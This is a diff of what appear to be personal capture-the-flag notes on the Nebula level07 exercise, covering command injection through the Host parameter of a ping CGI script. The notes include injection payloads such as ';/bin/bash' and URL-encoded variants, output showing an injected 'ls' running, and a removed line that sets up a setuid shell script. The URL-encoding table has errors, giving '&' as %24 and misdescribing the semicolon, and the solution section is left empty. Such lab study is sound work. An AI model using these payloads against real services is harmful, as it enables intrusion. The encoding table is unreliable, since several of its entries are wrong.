@@ -20,8 +20,8 @@ sub ping {
 }
 
 # check if Host set. if not, display normal page, etc
-
 ping(param("Host"));
+
 
 Information gathering:
 a. httpd is running as flag07
@@ -35,4 +35,64 @@ e.g.) http://192.168.10.133:7007/index.cgi?Host=www.google.com <= Host will be f
 c. As you can see, we can pass any commands to cgi program as a passing Host value
 http://192.168.10.133:7007/index.cgi?Host=;/bin/bash <== This will be replaced like ping -c 3 ;/bin/bash 
 
- echo '#!/bin/bash;/bin/bash' > /tmp/test;chmod +s /tmp/test
+d. Test cgi file with parameter through CLI
+level07@nebula:/home/flag07$ ./index.cgi Host=localhost
+Content-type: text/html
+
+<html><head><title>Ping results</title></head><body><pre>PING localhost (127.0.0.1) 56(84) bytes of data.
+64 bytes from localhost (127.0.0.1): icmp_req=1 ttl=64 time=0.016 ms
+64 bytes from localhost (127.0.0.1): icmp_req=2 ttl=64 time=0.034 ms
+64 bytes from localhost (127.0.0.1): icmp_req=3 ttl=64 time=0.031 ms
+
+--- localhost ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 1998ms
+rtt min/avg/max/mdev = 0.016/0.027/0.034/0.007 ms
+</pre></body></html>
+
+
+level07@nebula:/home/flag07$ ./index.cgi Host=localhost%3Bls
+Content-type: text/html
+
+<html><head><title>Ping results</title></head><body><pre>PING localhost (127.0.0.1) 56(84) bytes of data.
+64 bytes from localhost (127.0.0.1): icmp_req=1 ttl=64 time=0.018 ms
+64 bytes from localhost (127.0.0.1): icmp_req=2 ttl=64 time=0.034 ms
+64 bytes from localhost (127.0.0.1): icmp_req=3 ttl=64 time=0.104 ms
+
+--- localhost ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 1998ms
+rtt min/avg/max/mdev = 0.018/0.052/0.104/0.037 ms
+index.cgi
+thttpd.conf
+</pre></body></html>level07@nebula:/home/flag07$
+
+
+Lesson learned:
+a. URL encoding needed
+- When you send Unix commands as cgi parameter and your unix commands include special characters (special meaning with Internet browsers),
+you MUST encode those special characters.
+** Note: If the characters in URL is actual HTML codes, it SHOULD NOT be encoded. e.g. &amp <= & shouldn't be encoded as "%24amp" **
+
+Reserved Characters URL Encoding
+
+Character	        Purpose in URL  	                    Encoding
+===========   =======================================   ========
+  ;(semicolon) Separate protocol (http) from address	    %3B
+  /	           Separate domain and directories	          %2F
+  #	           Separate anchors	                          %23
+  ?	           Separate query string	                    %3F
+  &	           Separate query elements	                  %24
+  @	           Separate username and password from domain	%40
+  %	           Indicates an encoded character	            %25
+  +	           Indicates a space	                        %2B
+ <space>	     Not recommended in URLs	                  %20 or +
+====================================================================
+e.g.) 
+Commands to send: /bin/bash
+http://192.168.10.133:7007/index.cgi?Host=localhost%3B%2Fbin%2Fbash 
+** Special characters used as its original meaning with Browserd should not be encoded. Above example, ? is used as its original special
+meaning which is "separating query string"
+
+
+
+Sol.
+a. 
